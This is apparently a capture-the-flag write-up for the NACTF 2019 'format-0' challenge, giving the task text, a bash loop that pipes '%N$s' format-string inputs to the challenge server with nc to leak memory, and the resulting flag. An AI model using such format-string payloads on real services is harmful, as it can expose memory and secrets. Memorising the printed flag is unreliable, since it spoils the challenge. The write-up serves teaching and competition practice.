#### Challenge:

Someone didn't tell Chaddha not to give user input as the first argument to `printf()` - use it to leak the flag! `nc shell.2019.nactf.com 31782` [format-0.c](./format-0.c ":ignore") [format-0](./format-0 ":ignore")

---

#### Solution:

```bash
for i in `seq 1 40`; do
    echo "%$i\$s" | nc shell.2019.nactf.com 31782;
done
```

---

<details><summary>FLAG:</summary>

```
nactf{Pr1ntF_L34k_m3m0ry_r34d_nM05f469}
```

</details>
